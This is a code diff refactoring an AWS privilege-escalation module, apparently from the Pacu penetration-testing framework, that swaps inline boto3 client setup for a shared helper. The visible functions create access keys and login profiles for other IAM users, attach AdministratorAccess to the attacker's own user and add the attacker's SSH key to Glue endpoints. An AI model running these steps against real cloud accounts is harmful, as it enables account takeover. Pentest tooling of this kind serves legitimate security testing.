@@ -1,7 +1,5 @@
 #!/usr/bin/env python3
 import argparse
-import boto3
-import botocore
 from copy import deepcopy
 import json
 import os
@@ -488,16 +486,9 @@ def remove_empty_from_dict(d):
 
 def CreateNewPolicyVersion(pacu_main, print, input, fetch_data):
     session = pacu_main.get_active_session()
-    proxy_settings = pacu_main.get_proxy_settings()
 
     print('  Starting method CreateNewPolicyVersion...\n')
-    client = boto3.client(
-        'iam',
-        aws_access_key_id=session.access_key_id,
-        aws_secret_access_key=session.secret_access_key,
-        aws_session_token=session.session_token,
-        config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
-    )
+    client = pacu_main.get_boto3_client('iam')
 
     policy_arn = input('    Is there a specific policy you want to target? Enter its ARN now (just hit enter to automatically figure out a valid policy to target): ')
 
@@ -617,20 +608,11 @@ def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
 
 def CreateAccessKey(pacu_main, print, input, fetch_data):
     session = pacu_main.get_active_session()
-    proxy_settings = pacu_main.get_proxy_settings()
 
     print('  Starting method CreateAccessKey...')
 
-    client = boto3.client(
-        'iam',
-        aws_access_key_id=session.access_key_id,
-        aws_secret_access_key=session.secret_access_key,
-        aws_session_token=session.session_token,
-        config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
-    )
-
     username = input('    Is there a specific user you want to target? They must not already have two sets of access keys created for their user. Enter their user name now or just hit enter to enumerate users and view a list of options: ')
-    if fetch_data(['IAM', 'Users'], 'enum_users_roles_policies', '--users') is False:
+    if fetch_data(['IAM', 'Users'], 'enum_users_roles_policies_groups', '--users') is False:
         print('Pre-req module not run successfully. Exiting...')
         return False
     users = session.IAM['Users']
@@ -660,20 +642,11 @@ def CreateAccessKey(pacu_main, print, input, fetch_data):
 
 def CreateLoginProfile(pacu_main, print, input, fetch_data):
     session = pacu_main.get_active_session()
-    proxy_settings = pacu_main.get_proxy_settings()
 
     print('  Starting method CreatingLoginProfile...')
 
-    client = boto3.client(
-        'iam',
-        aws_access_key_id=session.access_key_id,
-        aws_secret_access_key=session.secret_access_key,
-        aws_session_token=session.session_token,
-        config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
-    )
-
     username = input('    Is there a specific user you want to target? They must not already have a login profile (password for logging into the AWS Console). Enter their user name now or just hit enter to enumerate users and view a list of options: ')
-    if fetch_data(['IAM', 'Users'], 'enum_users_roles_policies', '--users') is False:
+    if fetch_data(['IAM', 'Users'], 'enum_users_roles_policies_groups', '--users') is False:
         print('Pre-req module not run successfully. Exiting...')
         return False
     users = session.IAM['Users']
@@ -711,20 +684,11 @@ def CreateLoginProfile(pacu_main, print, input, fetch_data):
 
 def UpdateLoginProfile(pacu_main, print, input, fetch_data):
     session = pacu_main.get_active_session()
-    proxy_settings = pacu_main.get_proxy_settings()
 
     print('  Starting method UpdateLoginProfile...')
 
-    client = boto3.client(
-        'iam',
-        aws_access_key_id=session.access_key_id,
-        aws_secret_access_key=session.secret_access_key,
-        aws_session_token=session.session_token,
-        config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
-    )
-
     username = input('    Is there a specific user you want to target? They must already have a login profile (password for logging into the AWS Console). Enter their user name now or just hit enter to enumerate users and view a list of options: ')
-    if fetch_data(['IAM', 'Users'], 'enum_users_roles_policies', '--users') is False:
+    if fetch_data(['IAM', 'Users'], 'enum_users_roles_policies_groups', '--users') is False:
         print('Pre-req module not run successfully. Exiting...')
         return False
     users = session.IAM['Users']
@@ -761,17 +725,10 @@ def UpdateLoginProfile(pacu_main, print, input, fetch_data):
 
 def AttachUserPolicy(pacu_main, print, input, fetch_data):
     session = pacu_main.get_active_session()
-    proxy_settings = pacu_main.get_proxy_settings()
 
     print('  Starting method AttachUserPolicy...')
 
-    client = boto3.client(
-        'iam',
-        aws_access_key_id=session.access_key_id,
-        aws_secret_access_key=session.secret_access_key,
-        aws_session_token=session.session_token,
-        config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
-    )
+    client = pacu_main.get_boto3_client('iam')
 
     policy_arn = input('    Is there a specific policy you want to add to your user? Enter its ARN now or just hit enter to attach the AWS managed AdministratorAccess policy (arn:aws:iam::aws:policy/AdministratorAccess): ')
     if not policy_arn:
@@ -779,7 +736,7 @@ def AttachUserPolicy(pacu_main, print, input, fetch_data):
 
     try:
         active_aws_key = session.get_active_aws_key(pacu_main.database)
-        response = client.attach_user_policy(
+        client.attach_user_policy(
             UserName=active_aws_key['UserName'],
             policy_arn=policy_arn
         )
@@ -812,17 +769,10 @@ def PutRolePolicy(pacu_main, print, input, fetch_data):
 
 def AddUserToGroup(pacu_main, print, input, fetch_data):
     session = pacu_main.get_active_session()
-    proxy_settings = pacu_main.get_proxy_settings()
 
     print('  Starting method AddUserToGroup...')
 
-    client = boto3.client(
-        'iam',
-        aws_access_key_id=session.access_key_id,
-        aws_secret_access_key=session.secret_access_key,
-        aws_session_token=session.session_token,
-        config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
-    )
+    client = pacu_main.get_boto3_client('iam')
 
     group_name = input('    Is there a specific group you want to add your user to? Enter the name now or just press enter to enumerate a list possible groups to choose from: ')
     if group_name == '':
@@ -842,7 +792,7 @@ def AddUserToGroup(pacu_main, print, input, fetch_data):
 
     try:
         active_aws_key = session.get_active_aws_key(pacu_main.database)
-        response = client.add_user_to_group(
+        client.add_user_to_group(
             GroupName=group_name,
             UserName=active_aws_key['UserName']
         )
@@ -880,17 +830,8 @@ def PassExistingRoleToNewGlueDevEndpoint(pacu_main, print, input, fetch_data):
 
 def UpdateExistingGlueDevEndpoint(pacu_main, print, input, fetch_data):
     session = pacu_main.get_active_session()
-    proxy_settings = pacu_main.get_proxy_settings()
 
     print('  Starting method UpdateExistingGlueDevEndpoint...')
-
-    client = boto3.client(
-        'glue',
-        aws_access_key_id=session.access_key_id,
-        aws_secret_access_key=session.secret_access_key,
-        aws_session_token=session.session_token,
-        config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
-    )
 
     endpoint_name = input('    Is there a specific Glue Development Endpoint you want to target? Enter the name of it now or just hit enter to enumerate development endpoints and view a list of options: ')
     pub_ssh_key = input('    Enter your personal SSH public key to access the development endpoint (in the format of an authorized_keys file: ssh-rsa AAASDJHSKH....AAAAA== name) or just hit enter to skip this privilege escalation attempt: ')
@@ -914,9 +855,10 @@ def UpdateExistingGlueDevEndpoint(pacu_main, print, input, fetch_data):
             endpoint_name = input('    Enter a development endpoint name: ')
         else:
             endpoint_name = dev_endpoints[int(choice) - 1]['EndpointName']
+        client = pacu_main.get_boto3_client('glue', dev_endpoints[int(choice) - 1]['Region'])
 
     try:
-        response = client.update_dev_endpoint(
+        client.update_dev_endpoint(
             EndpointName=endpoint_name,
             PublicKey=pub_ssh_key
         )
